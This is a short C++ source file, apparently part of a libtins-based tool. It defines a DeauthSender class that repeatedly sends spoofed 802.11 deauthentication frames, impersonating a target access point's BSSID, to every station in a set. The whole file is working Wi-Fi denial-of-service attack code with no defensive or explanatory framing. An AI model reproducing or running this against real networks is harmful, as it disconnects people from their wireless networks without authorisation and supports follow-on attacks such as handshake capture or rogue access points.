#include "deauthsender.h"

DeauthSender::DeauthSender(string inf, string bssid) {
	this->inf = inf;
	targetBSSID = bssid;
}

std::thread DeauthSender::getSendThread(set<HWAddress<6>> *set) {
	return std::thread(&DeauthSender::sendDeauth, this, set);
}

void DeauthSender::sendDeauth(set<HWAddress<6>> *addressSet) {
	if (addressSet == NULL)
		return;
	
	Dot11Deauthentication deauth;
	RadioTap radio = RadioTap();
	deauth.addr2(this->targetBSSID);
	deauth.addr3(deauth.addr2());

	while (flag) {
		PacketSender sender(this->inf);

		for (auto iter = addressSet->begin(); iter != addressSet->end(); ++iter) {
			auto addr = *iter;
			deauth.addr1(addr);
			RadioTap pkt = radio / deauth;

			for (int i = 0; i < SEND_NUM_PER_STA; i++)
				sender.send(pkt);

			std::this_thread::sleep_for(std::chrono::milliseconds(100));
		}
	}
}